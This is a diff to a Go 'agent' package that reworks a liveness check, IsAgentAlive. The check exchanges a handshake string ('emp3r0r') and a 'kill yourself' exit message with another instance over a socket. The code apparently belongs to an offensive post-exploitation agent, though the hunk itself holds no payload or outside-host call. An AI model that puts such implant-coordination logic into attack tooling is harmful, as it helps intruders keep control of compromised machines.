@@ -1,6 +1,7 @@
 package agent
 
 import (
+	"context"
 	"encoding/json"
 	"errors"
 	"fmt"
@@ -23,15 +24,17 @@ import (
 func IsAgentAlive(c net.Conn) bool {
 	log.Println("Testing if agent is alive...")
 	defer c.Close()
+	ctx, cancel := context.WithCancel(context.Background())
+	defer cancel()
 
 	replyFromAgent := make(chan string, 1)
 	reader := func(r io.Reader) {
 		buf := make([]byte, 1024)
-		for {
+		for ctx.Err() == nil {
 			n, err := r.Read(buf[:])
 			if err != nil {
-				log.Printf("Read error: %v, guess agent is dead", err)
-				return
+				log.Printf("Read error: %v", err)
+				cancel()
 			}
 			replyFromAgent <- string(buf[0:n])
 		}
@@ -41,17 +44,18 @@ func IsAgentAlive(c net.Conn) bool {
 	go reader(c)
 
 	// send hello to agent
-	for {
+	for ctx.Err() == nil {
 		_, err := c.Write([]byte(fmt.Sprintf("%d", os.Getpid())))
 		if err != nil {
 			log.Printf("Write error: %v, agent is likely to be dead", err)
 			break
 		}
-		if strings.Contains(<-replyFromAgent, "kill yourself") {
+		resp := <-replyFromAgent
+		if strings.Contains(resp, "kill yourself") {
 			log.Printf("Agent told me to kill myself (%d)", os.Getpid())
 			os.Exit(0)
 		}
-		if strings.Contains(<-replyFromAgent, "emp3r0r") {
+		if strings.Contains(resp, "emp3r0r") {
 			log.Println("Yes it's alive")
 			return true
 		}
